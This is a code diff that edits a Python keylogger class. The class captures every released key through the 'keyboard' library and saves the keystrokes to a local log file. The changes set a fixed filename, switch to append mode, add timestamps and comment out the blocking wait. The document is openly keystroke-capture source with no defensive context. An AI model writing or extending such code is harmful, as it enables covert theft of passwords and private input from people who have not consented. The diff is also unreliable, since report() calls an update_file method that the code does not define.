@@ -9,7 +9,7 @@ class Keylogger:
         self.interval = interval
         self.log = ""
         self.start_dt = datetime.now()
-        self.end_dt = datetime.now()
+        self.filename = "log"   #here filename
 
     def callback(self, event):
         name = event.name
@@ -27,20 +27,19 @@ class Keylogger:
     
     def update_filename(self):
         start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
-        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
-        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
+        self.log = f"keylog-{start_dt_str} " + self.log
 
     def report_to_file(self):
         # open the file in write mode (create it)
-        with open(f"{self.filename}.txt", "w") as f:
+        with open(f"{self.filename}.txt", "a") as f:    
             # write the keylogs to the file
             print(self.log, file=f)
+
         print(f"[+] Saved {self.filename}.txt")
 
     def report(self):
         if self.log:
-            self.end_dt = datetime.now()
-            self.update_filename()
+            self.update_file()
             self.report_to_file()
             self.start_dt = datetime.now()
         self.log = ""
@@ -52,7 +51,7 @@ class Keylogger:
         self.start_dt = datetime.now()
         keyboard.on_release(callback=self.callback)
         self.report()
-        keyboard.wait()
+        #keyboard.wait('|')
 
 
 if __name__ == "__main__":
